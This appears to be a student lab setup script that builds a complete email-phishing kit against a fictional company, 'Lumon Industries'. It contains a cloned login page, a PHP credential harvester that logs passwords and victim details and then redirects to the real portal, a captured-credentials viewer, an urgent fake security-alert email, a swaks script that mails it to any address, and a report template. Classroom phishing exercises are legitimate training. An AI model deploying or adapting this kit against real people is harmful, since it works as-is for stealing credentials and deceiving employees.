#!/bin/bash
# Consolidated Email Phishing Lab Setup Script
# This script handles the complete setup for both Kali VM (server) and Mac (viewing) components

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔════════════════════════════════════════════════╗"
echo "║                                                ║"
echo "║       EMAIL PHISHING LAB SETUP (MAC+KALI)      ║"
echo "║                                                ║"
echo "╚════════════════════════════════════════════════╝"
echo -e "${NC}"

# Function to check if a command was successful
check_status() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[SUCCESS]${NC} $1"
    else
        echo -e "${RED}[FAILED]${NC} $1"
        echo "Please check the error and try again."
        exit 1
    fi
}

# Get Kali VM's IP address
echo -e "${YELLOW}[INFO]${NC} Determining Kali VM's IP address..."
KALI_IP=$(hostname -I | awk '{print $1}')
echo -e "${GREEN}[SUCCESS]${NC} Kali VM IP: ${KALI_IP}"

#=========================#
# 1. MAC ACCESS SETUP     #
#=========================#
echo -e "${YELLOW}[INFO]${NC} Setting up Mac access components..."

# Create directories
mkdir -p mac_access phishing_site
check_status "Created directories"

# Create the HTML file for Mac access
cat > mac_access/open_on_mac.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Phishing Lab - Mac Access Links</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .url-box {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        h2 {
            color: #333;
        }
        .button {
            display: inline-block;
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 4px;
            margin-top: 10px;
        }
        .button:hover {
            background-color: #45a049;
        }
        .note {
            font-style: italic;
            color: #666;
        }
    </style>
</head>
<body>
    <h1>Phishing Lab - Mac Access Links</h1>
    <p>Open these links on your Mac to view and take screenshots of the phishing lab components.</p>
    
    <div class="url-box">
        <h2>1. Phishing Website (for screenshots)</h2>
        <p>This is the fake login page that will harvest credentials:</p>
        <a href="http://${KALI_IP}" class="button" target="_blank">Open Phishing Site</a>
        <p class="note">Take a screenshot of this page for your lab report.</p>
    </div>
    
    <div class="url-box">
        <h2>2. Email Preview (for screenshots)</h2>
        <p>This is how the phishing email will look (styled HTML version):</p>
        <a href="http://${KALI_IP}/phishing_email_preview.html" class="button" target="_blank">Preview Phishing Email</a>
        <p class="note">Take a screenshot of this email preview for your lab report.</p>
    </div>
    
    <div class="url-box">
        <h2>3. Captured Credentials (for screenshots)</h2>
        <p>After someone enters credentials, you can view them here:</p>
        <a href="http://${KALI_IP}/view_credentials.php" class="button" target="_blank">View Captured Credentials</a>
        <p class="note">Take a screenshot after credentials are captured for your lab report.</p>
    </div>
    
    <h2>Instructions:</h2>
    <ol>
        <li>Save this HTML file to your Mac</li>
        <li>Open it in any browser on your Mac</li>
        <li>Use the buttons above to access and screenshot the phishing components</li>
        <li>Make sure the Kali VM web server is running before clicking the links</li>
    </ol>
</body>
</html>
EOF
check_status "Created Mac access HTML file"

# Create instructions for transferring to Mac
cat > mac_access/how_to_access_from_mac.txt << EOF
===== HOW TO ACCESS PHISHING LAB FROM YOUR MAC =====

To take screenshots on your Mac, copy the open_on_mac.html file to your Mac using one of these methods:

Method 1: Using SCP (secure copy)
-------------------------------
On your Mac, run this command:
scp kali@${KALI_IP}:$(pwd)/mac_access/open_on_mac.html ~/Desktop/

Method 2: Using a temporary HTTP server
-----------------------------------
On the Kali VM, run:
cd mac_access && python3 -m http.server 8000

Then on your Mac, open a browser and go to:
http://${KALI_IP}:8000/open_on_mac.html
Save the page to your Mac.

Method 3: Copy-paste the content
-----------------------------
Open the file in a text editor on Kali:
nano mac_access/open_on_mac.html

Copy all the content, create a new file on your Mac, paste the content, and save it with the .html extension.

===== AFTER COPYING =====
1. Open the HTML file on your Mac
2. Make sure the phishing site is running on Kali VM
3. Use the links in the HTML file to view and screenshot each component
EOF
check_status "Created Mac access instructions"

#=========================#
# 2. PHISHING SITE SETUP  #
#=========================#
echo -e "${YELLOW}[INFO]${NC} Setting up phishing website components..."

# Create phishing login page
cat > phishing_site/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lumon Industries - Employee Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            text-align: center;
            color: #003366;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002244;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/200x60?text=Lumon+Industries" alt="Lumon Industries">
        </div>
        <h2>Employee Portal Login</h2>
        <form action="credentials.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            &copy; 2023 Lumon Industries. All rights reserved.
        </div>
    </div>
</body>
</html>
EOF
check_status "Created phishing login page"

# Create credential harvesting script
cat > phishing_site/credentials.php << 'EOF'
<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Look for various common username/email field names
    foreach (['username', 'user', 'email', 'login', 'user_id', 'userid'] as $field) {
        if (isset($_POST[$field])) {
            $username = $_POST[$field];
            break;
        }
    }
    
    // Look for various common password field names
    foreach (['password', 'pass', 'pwd', 'passwd'] as $field) {
        if (isset($_POST[$field])) {
            $password = $_POST[$field];
            break;
        }
    }
    
    // If username and password weren't found with common names, log all POST data
    if (empty($username) || empty($password)) {
        $post_data = print_r($_POST, true);
    } else {
        $post_data = '';
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    if (!empty($post_data)) {
        $log_entry .= "All POST data:\n$post_data\n";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Redirect to a legitimate site
    header('Location: https://portal.lumoninc.com');
    exit;
}
?>
EOF
check_status "Created credential harvesting script"

# Create email preview
cat > phishing_site/phishing_email_preview.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Urgent: Account Security Verification Required</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
        <!-- HEADER WITH LOGO -->
        <tr>
            <td align="center" bgcolor="#003366" style="padding: 20px 0;">
                <img src="https://via.placeholder.com/180x60?text=Lumon+Industries" alt="Lumon Industries" width="180" style="display: block;">
            </td>
        </tr>
        
        <!-- CONTENT AREA -->
        <tr>
            <td bgcolor="#ffffff" style="padding: 40px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
                            Urgent: Security Alert - Immediate Action Required
                        </td>
                    </tr>
                    <tr>
                        <td style="padding: 20px 0;">
                            <p>Dear Valued Employee,</p>
                            
                            <p>The IT Security department has detected multiple unauthorized access attempts on your company account. According to our logs, these attempts originated from an unrecognized device.</p>
                            
                            <p>As part of our updated security protocols, <strong>you must verify your account credentials within the next 24 hours</strong> to maintain access to all Lumon Industries systems.</p>
                            
                            <p>This verification is mandatory according to our new company-wide security policy.</p>
                        </td>
                    </tr>
                    <tr>
                        <td align="center" style="padding: 30px 0;">
                            <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" bgcolor="#003366" style="border-radius: 4px;">
                                        <a href="http://${KALI_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact the IT Security team at security@mail.lumoninc.com.</p>
                            
                            <p>Failure to verify your account within the specified timeframe may result in temporary account suspension until proper identity verification can be completed.</p>
                            
                            <p>Thank you for your prompt attention to this matter.</p>
                            
                            <p>Regards,<br>
                            Lumon Industries IT Security Team</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        
        <!-- FOOTER -->
        <tr>
            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #666666; font-size: 12px;">
                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
                            <p>&copy; 2023 Lumon Industries. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
EOF
check_status "Created email preview HTML"

# Create credentials viewer
cat > phishing_site/view_credentials.php << 'EOF'
<?php
$log_file = 'captured_credentials.txt';

// Function to format the log entries for better display
function formatLogEntries($content) {
    // Replace the separator lines with HTML for better formatting
    $content = str_replace("==================================", "<hr>", $content);
    
    // Make line breaks display properly in HTML
    $content = nl2br($content);
    
    // Highlight important information
    $content = preg_replace('/Username\/Email: (.+?)(<br \/>|$)/i', 'Username/Email: <strong style="color:red">$1</strong>$2', $content);
    $content = preg_replace('/Password: (.+?)(<br \/>|$)/i', 'Password: <strong style="color:red">$1</strong>$2', $content);
    
    return $content;
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Captured Credentials - Phishing Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 1px solid #ddd;
            padding-bottom: 10px;
        }
        .credentials {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            white-space: pre-wrap;
        }
        .refresh {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin-top: 20px;
        }
        .no-creds {
            color: #999;
            font-style: italic;
        }
        hr {
            border: 0;
            height: 1px;
            background: #ddd;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Captured Credentials</h1>
        <p>Below are the credentials captured from your phishing site. Take a screenshot of this page for your lab report.</p>
        
        <div class="credentials">
            <?php
            if (file_exists($log_file) && filesize($log_file) > 0) {
                $content = file_get_contents($log_file);
                echo formatLogEntries($content);
            } else {
                echo '<p class="no-creds">No credentials have been captured yet.</p>';
            }
            ?>
        </div>
        
        <a href="view_credentials.php" class="refresh">Refresh</a>
        <p><small>Note: This page automatically refreshes every 30 seconds.</small></p>
    </div>
    
    <script>
        // Auto-refresh the page every 30 seconds
        setTimeout(function() {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
EOF
check_status "Created credentials viewer"

# Create web server launcher
cat > phishing_site/start_server.sh << 'EOF'
#!/bin/bash
# Script to start the web server

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[INFO]${NC} Starting web server on port 80..."

if command -v php > /dev/null; then
    # Use PHP's built-in server if available
    echo -e "${GREEN}[INFO]${NC} Using PHP's built-in server..."
    sudo php -S 0.0.0.0:80
elif command -v python3 > /dev/null; then
    # Use Python's HTTP server if available
    echo -e "${GREEN}[INFO]${NC} Using Python's HTTP server..."
    sudo python3 -m http.server 80
elif command -v python > /dev/null; then
    # Fall back to Python 2's SimpleHTTPServer
    echo -e "${GREEN}[INFO]${NC} Using Python 2's SimpleHTTPServer..."
    sudo python -m SimpleHTTPServer 80
else
    echo -e "${RED}[ERROR]${NC} No suitable web server found. Please install PHP or Python."
    exit 1
fi
EOF
chmod +x phishing_site/start_server.sh
check_status "Created web server launcher"

# Create credential monitoring script
cat > phishing_site/monitor_credentials.sh << 'EOF'
#!/bin/bash
# Script to monitor for captured credentials

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[INFO]${NC} Monitoring for captured credentials. Press Ctrl+C to stop."
echo -e "${YELLOW}[INFO]${NC} Waiting for victims to enter their credentials..."

if [ ! -f "captured_credentials.txt" ]; then
    touch captured_credentials.txt
fi

tail -f captured_credentials.txt
EOF
chmod +x phishing_site/monitor_credentials.sh
check_status "Created credentials monitoring script"

#=========================#
# 3. EMAIL SETUP          #
#=========================#
echo -e "${YELLOW}[INFO]${NC} Setting up email components..."

# Create the email sending script
cat > send_phishing_email.sh << 'EOF'
#!/bin/bash
# Script to send the phishing email

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔════════════════════════════════════════════════╗"
echo "║                                                ║"
echo "║         AUTOMATED PHISHING EMAIL SENDER        ║"
echo "║                                                ║"
echo "╚════════════════════════════════════════════════╝"
echo -e "${NC}"

# Get SSH port to determine email username
echo -e "${YELLOW}[INPUT]${NC} Enter your SSH port number (e.g., 23101):"
read SSH_PORT
if [[ ! $SSH_PORT =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[ERROR]${NC} Invalid port number. Using a placeholder."
    EMAIL_USER="sXXX@mail.lumoninc.com"
else
    # Extract last 3 digits for email username
    LAST_THREE="${SSH_PORT: -3}"
    EMAIL_USER="s${LAST_THREE}@mail.lumoninc.com"
fi

# Get password
echo -e "${YELLOW}[INPUT]${NC} Enter your email password:"
read -s EMAIL_PASSWORD

# Get target email
echo -e "${YELLOW}[INPUT]${NC} Enter target email address (or press Enter to send to yourself):"
read TARGET_EMAIL
if [ -z "$TARGET_EMAIL" ]; then
    TARGET_EMAIL="${EMAIL_USER}"
    echo -e "${YELLOW}[INFO]${NC} Will send to your own address: ${TARGET_EMAIL}"
fi

# Attempt to send using swaks first, then fall back to other methods
if command -v swaks > /dev/null; then
    echo -e "${YELLOW}[INFO]${NC} Sending email using swaks..."
    swaks --to "${TARGET_EMAIL}" \
          --from "${EMAIL_USER}" \
          --server mail.lumoninc.com \
          --port 25 \
          --auth-user "${EMAIL_USER}" \
          --auth-password "${EMAIL_PASSWORD}" \
          --h-Subject "Urgent: Security Alert - Immediate Action Required" \
          --body "$(cat phishing_site/phishing_email_preview.html)"
          
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to ${TARGET_EMAIL}"
    else
        echo -e "${RED}[FAILED]${NC} Failed to send email with swaks."
        echo -e "${YELLOW}[INFO]${NC} Check your email client configuration and try again."
        echo -e "${YELLOW}[INFO]${NC} Installing swaks: sudo apt update && sudo apt install swaks"
    fi
else
    echo -e "${YELLOW}[INFO]${NC} swaks not found. Please install it:"
    echo -e "${YELLOW}[INFO]${NC} sudo apt update && sudo apt install swaks"
    echo -e "${YELLOW}[INFO]${NC} Then run this script again."
fi

# Provide info for manual testing
echo -e "${YELLOW}[INFO]${NC} For manual testing, use these email settings:"
echo -e "    SMTP Server: mail.lumoninc.com"
echo -e "    Port: 25"
echo -e "    Username: ${EMAIL_USER}"
echo -e "    Password: (your password)"
echo -e "    Security: None"
EOF
chmod +x send_phishing_email.sh
check_status "Created email sending script"

# Create lab report template
cat > lab_report_template.md << 'EOF'
# Email Phishing Lab Report

## Student Information
- **Name:** [YOUR NAME]
- **Student ID:** [YOUR ID]
- **Date:** [DATE OF COMPLETION]

## 1. Phishing Approach

### Email Content Strategy
I crafted a phishing email that appeared to come from the Lumon Industries IT Security team. The email claimed that unauthorized access attempts had been detected on the recipient's account and required them to verify their credentials immediately.

Key psychological tactics used:
- **Urgency:** Mentioned a 24-hour deadline to create time pressure
- **Fear:** Implied security threat to the user's account
- **Authority:** Posed as the IT Security team with official formatting
- **Consequence:** Stated account suspension would occur if action wasn't taken

### Technical Implementation
I used the following tools to execute the phishing campaign:
- **Website Cloning:** Created a convincing replica of the Lumon Industries employee portal
- **Credential Harvesting:** Implemented a PHP script to capture and log submitted credentials
- **Email Delivery:** Configured an email client to send HTML-formatted emails through the Lumon mail server

## 2. Technical Implementation

### Server Configuration
The phishing website was hosted on a server with IP address: [YOUR_SERVER_IP]

The web server was configured to:
- Host the cloned login page
- Process form submissions through the credential harvesting script
- Log captured information to a text file
- Redirect victims to the legitimate site after capturing credentials

### Email Configuration
I configured the email account with the following settings:
- **SMTP Server:** mail.lumoninc.com
- **Port:** 25
- **Username:** [YOUR_EMAIL_USERNAME]
- **Authentication:** Normal password

## 3. Results and Analysis

### Victim Interaction
The target received and opened the phishing email at [TIME]. They clicked the link and were directed to the phishing site, where they entered their credentials.

### Captured Data
The following credentials were successfully captured:
- **Username:** [CAPTURED_USERNAME]
- **Password:** [CAPTURED_PASSWORD]
- **Timestamp:** [CAPTURE_TIME]
- **IP Address:** [VICTIM_IP]
- **User Agent:** [BROWSER_INFO]

## 4. Challenges and Solutions

During the execution of this lab, I encountered the following challenges:

1. **Challenge:** [DESCRIBE_CHALLENGE]
   **Solution:** [EXPLAIN_SOLUTION]

2. **Challenge:** [DESCRIBE_CHALLENGE]
   **Solution:** [EXPLAIN_SOLUTION]

## 5. Effectiveness Analysis

The phishing attempt was successful due to several factors:
- The email appeared legitimate with proper formatting and branding
- The urgency created by the security alert prompted immediate action
- The cloned website was visually identical to the legitimate portal
- The redirection to the real site after credential capture prevented suspicion

Areas for improvement:
- [AREA_FOR_IMPROVEMENT]
- [AREA_FOR_IMPROVEMENT]

## 6. Security Implications and Prevention

This exercise demonstrated how easily users can be manipulated into revealing sensitive information. To prevent such attacks:

- Implement multi-factor authentication
- Train users to verify email sender addresses
- Encourage verification through official channels rather than email links
- Use email filtering to detect phishing attempts

## 7. Screenshots

### Phishing Email
[INSERT_EMAIL_SCREENSHOT_HERE]

### Cloned Website
[INSERT_WEBSITE_SCREENSHOT_HERE]

### Captured Credentials
[INSERT_CREDENTIALS_LOG_SCREENSHOT_HERE]

## 8. Conclusion

This lab effectively demonstrated the end-to-end process of executing a phishing attack, from crafting persuasive content to technical implementation and credential capture. It highlights the importance of user education and technical controls in preventing such attacks in real-world environments.
EOF
check_status "Created lab report template"

# Final instructions
echo -e "${YELLOW}\n============================================================${NC}"
echo -e "${GREEN}Setup Complete! Follow these steps:${NC}"
echo -e "${YELLOW}============================================================${NC}"
echo -e "1. Follow Mac access instructions in: ${GREEN}mac_access/how_to_access_from_mac.txt${NC}"
echo -e "2. Start the web server: ${GREEN}cd phishing_site && ./start_server.sh${NC}"
echo -e "3. Send the phishing email: ${GREEN}./send_phishing_email.sh${NC}"
echo -e "4. Monitor for credentials: ${GREEN}cd phishing_site && ./monitor_credentials.sh${NC}"
echo -e "${YELLOW}============================================================${NC}"
echo -e "${GREEN}All files have been set up with your Kali IP: ${KALI_IP}${NC}"
echo -e "${YELLOW}============================================================${NC}" 